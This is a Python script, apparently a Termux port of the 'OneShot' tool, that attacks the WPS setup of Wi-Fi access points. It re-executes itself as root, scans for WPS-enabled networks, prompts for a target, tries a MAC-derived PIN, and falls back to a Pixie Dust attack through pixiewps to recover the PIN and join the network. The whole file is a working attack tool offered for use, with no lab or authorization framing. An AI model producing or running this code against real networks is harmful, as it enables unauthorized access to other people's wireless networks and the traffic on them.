#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OneShot Wi-Fi Security Tool – Termux Edition v3.1
================================================
Minimal WPS attack script (PIN + Pixie Dust) refactored to run reliably
inside **Termux** on rooted Android 10–14.

Key features
------------
* No hard-coded Linux paths – binaries resolved at runtime.
* Automatic privilege escalation through *tsu/sudo*.
* Interface auto-detect and coloured output (optional Rich).
* Asynchronous handling of wpa_supplicant.
"""

from __future__ import annotations

import asyncio
import os
import re
import shutil
import subprocess as sp
import sys
import tempfile
import textwrap
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

# ──────────────────────────────────────────────────────────────────────────────
# Optional Rich pretty-printing
try:
    from rich import print as rprint
    from rich.console import Console
    from rich.table import Table
except ModuleNotFoundError:      # fallback to plain text
    rprint = print               # type: ignore
    Console = None               # type: ignore
    Table = None                 # type: ignore

__VERSION__ = "3.1-termux"

PREFIX   = Path(os.getenv("PREFIX", "/data/data/com.termux/files/usr"))
TMPDIR   = PREFIX / "tmp"
DATADIR  = Path.home() / ".oneshot"
DATADIR.mkdir(parents=True, exist_ok=True)

# ──────────────────────────────────────────────────────────────────────────────
# Utility helpers
def coloured(text: str, colour: str | None = None) -> str:
    if Console is None or colour is None:
        return text
    palette = {"green": "[green]{}[/]",
               "red": "[red]{}[/]",
               "yellow": "[yellow]{}[/]"}
    return palette.get(colour, "{}").format(text)

def which(name: str, mandatory: bool = True) -> str:
    """Return absolute path or exit with helpful message."""
    path = shutil.which(name)
    if path:
        return path
    if mandatory:
        sys.exit(f"[!] Required binary '{name}' not found – "
                 f"install it via 'pkg install {name}'.")
    return ""

# ──────────────────────────────────────────────────────────────────────────────
# Privilege escalation – re-exec through tsu/sudo if needed
if os.geteuid() != 0:
    escalator = shutil.which("tsu") or shutil.which("sudo")
    if escalator:
        os.execvp(escalator, [escalator] + sys.argv)      # never returns
    else:
        sys.exit("[!] Must be run as root – install tsu or sudo in Termux.")

# ──────────────────────────────────────────────────────────────────────────────
# External tool resolution
WPA_SUPPLICANT = which("wpa_supplicant")
IW             = which("iw")
PIXIEWPS       = which("pixiewps", mandatory=False)

# ──────────────────────────────────────────────────────────────────────────────
# WPS checksum util
def wps_checksum(pin7: int) -> int:
    accum = 0
    while pin7:
        accum += 3 * (pin7 % 10)
        pin7 //= 10
        accum += pin7 % 10
        pin7 //= 10
    return (10 - accum % 10) % 10

# Single vendor-independent MAC-based algorithm (24-bit NIC)
def mac24_pin(mac: str) -> str:
    nic  = int(mac.replace(":", ""), 16) & 0xFFFFFF
    pin7 = nic % 10_000_000
    return f"{pin7:07d}{wps_checksum(pin7)}"

# ──────────────────────────────────────────────────────────────────────────────
# Async wrapper around wpa_supplicant control socket
class WPASupplicant:
    def __init__(self, iface: str):
        self.iface     = iface
        self.ctrl_dir  = TMPDIR / f"wpas_{iface}_{os.getpid()}"
        self.ctrl_dir.mkdir(parents=True, exist_ok=True)
        self.ctrl_path = self.ctrl_dir / iface
        self.proc: Optional[sp.Popen[str]] = None

    async def __aenter__(self):
        cmd = [
            WPA_SUPPLICANT,
            "-i", self.iface,
            "-Dnl80211",
            "-C", str(self.ctrl_dir),
            "-f", str(TMPDIR / "wpa_supplicant.log"),
            "-dd"                                    # extra debug
        ]
        self.proc = sp.Popen(cmd,
                             stdout=sp.PIPE,
                             stderr=sp.STDOUT,
                             text=True)
        # Wait until control socket appears
        for _ in range(50):
            if self.ctrl_path.exists():
                break
            await asyncio.sleep(0.1)
        else:
            raise RuntimeError("wpa_supplicant control socket not created")
        return self

    async def __aexit__(self, exc_type, exc, tb):
        if self.proc:
            self.proc.terminate()
            await asyncio.sleep(0.5)
            self.proc.kill()
        shutil.rmtree(self.ctrl_dir, ignore_errors=True)

    # low-level send/receive over Unix datagram socket
    async def command(self, cmd: str) -> str:
        reader, writer = await asyncio.open_unix_connection(str(self.ctrl_path))
        writer.write(cmd.encode())
        await writer.drain()
        data = await reader.read()
        writer.close()
        await writer.wait_closed()
        return data.decode(errors="replace")

# ──────────────────────────────────────────────────────────────────────────────
# Interface helpers
def auto_interface() -> str:
    out = sp.check_output([IW, "dev"], text=True)
    candidates = re.findall(r"Interface (\w+)", out)
    if not candidates:
        sys.exit("[!] No wireless interfaces found via 'iw dev'.")
    return candidates[0]

# ──────────────────────────────────────────────────────────────────────────────
# Scan – pick BSSID
async def scan_and_select(iface: str) -> str:
    print("[*] Scanning for WPS-enabled networks …")
    proc = await asyncio.create_subprocess_exec(
        IW, "dev", iface, "scan",
        stdout=asyncio.subprocess.PIPE,
        text=True
    )
    stdout, _ = await proc.communicate()

    networks: Dict[int, Dict[str, str]] = {}
    current: Dict[str, str] = {}
    for line in stdout.splitlines():
        line = line.strip()
        if m := re.match(r"BSS (\S+)", line):
            if current:
                networks[len(networks)+1] = current
            current = {"bssid": m.group(1).upper(),
                       "essid": "",
                       "wps": False}
        elif "WPS:" in line:
            current["wps"] = True
        elif line.startswith("SSID:"):
            current["essid"] = line.split("SSID:", 1)[1].strip()
    if current:
        networks[len(networks)+1] = current

    if not networks:
        sys.exit("[-] No WPS networks found.")

    # print table
    if Table:
        table = Table(title="WPS Networks")
        table.add_column("#")
        table.add_column("BSSID")
        table.add_column("ESSID")
        for idx, info in networks.items():
            table.add_row(str(idx), info["bssid"], info["essid"])
        Console().print(table)
    else:
        for idx, info in networks.items():
            print(f"{idx}) {info['bssid']}  {info['essid']}")
    choice = int(input("Select target # > "))
    return networks[choice]["bssid"]

# ──────────────────────────────────────────────────────────────────────────────
# High-level attack logic (PIN first, Pixie fallback)
async def wps_attack(iface: str, bssid: str):
    pin = mac24_pin(bssid)
    print(f"[*] Trying MAC-derived PIN {pin} on {bssid} …")

    async with WPASupplicant(iface) as wpa:
        await wpa.command(f"WPS_REG {bssid} {pin}")
        start = datetime.now()
        pixie_lines: List[str] = []

        while (datetime.now() - start).seconds < 90:        # 90-s timeout
            await asyncio.sleep(1)
            if not wpa.proc or not wpa.proc.stdout:
                break
            line = wpa.proc.stdout.readline()
            if not line:
                continue
            sys.stderr.write(line)        # verbose debug

            if "WSC_NACK" in line or "WPA: 4-Way Handshake failed" in line:
                print("[-] PIN incorrect")
                break
            if "WPA: Key negotiation completed" in line:
                print("[+] WPA key obtained – network cracked!")
                return
            if any(tag in line for tag in
                   ["Enrollee Nonce", "Public Key", "AuthKey",
                    "E-Hash1", "E-Hash2"]):
                pixie_lines.append(line)

    # ── Pixie Dust fallback ────────────────────────────────────────────────
    if PIXIEWPS and len(pixie_lines) >= 5:
        cmd = [PIXIEWPS]
        # extract required fields
        def grab(tag: str) -> str:
            patt = tag.replace("-", "").upper()
            return "".join(re.findall(
                fr"{patt}: ([0-9A-F]{{32,}})", "\n".join(pixie_lines)))
        for field in ["pke", "pkr", "e-hash1", "e-hash2", "authkey", "e-nonce"]:
            val = grab(field)
            if val:
                cmd += [f"--{field}", val]

        print("[*] Launching PixieWPS …")
        out = sp.run(cmd, text=True, capture_output=True)
        print(out.stdout)
        for l in out.stdout.splitlines():
            if "WPS pin" in l:
                pixie_pin = l.split(":")[-1].strip()
                print(f"[+] PixieWPS recovered PIN {pixie_pin}")
                await wps_attack_manual(iface, bssid, pixie_pin)
                return

async def wps_attack_manual(iface: str, bssid: str, pin: str):
    async with WPASupplicant(iface) as wpa:
        await wpa.command(f"WPS_REG {bssid} {pin}")
        start = datetime.now()
        while (datetime.now() - start).seconds < 60:
            await asyncio.sleep(1)
            if not wpa.proc or not wpa.proc.stdout:
                break
            line = wpa.proc.stdout.readline()
            if "WPA: Key negotiation completed" in line:
                print("[+] Network cracked with Pixie PIN!")
                return
        print("[-] Could not authenticate using Pixie PIN")

# ──────────────────────────────────────────────────────────────────────────────
# Main
def main():
    import argparse

    ap = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="OneShot – quick WPS attack tool for Termux",
        epilog=textwrap.dedent("""
            Examples:
              oneshot_termux_2025.py -i wlan1
              oneshot_termux_2025.py -b AA:BB:CC:DD:EE:FF
        """)
    )
    ap.add_argument("-i", "--interface",
                    help="wireless interface (monitor-capable)")
    ap.add_argument("-b", "--bssid",
                    help="target BSSID (optional – will scan)")
    args = ap.parse_args()

    iface = args.interface or auto_interface()
    if not Path(f"/sys/class/net/{iface}").exists():
        sys.exit(f"[!] Interface '{iface}' not found.")

    bssid = args.bssid or asyncio.run(scan_and_select(iface))
    asyncio.run(wps_attack(iface, bssid))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted – exiting.")
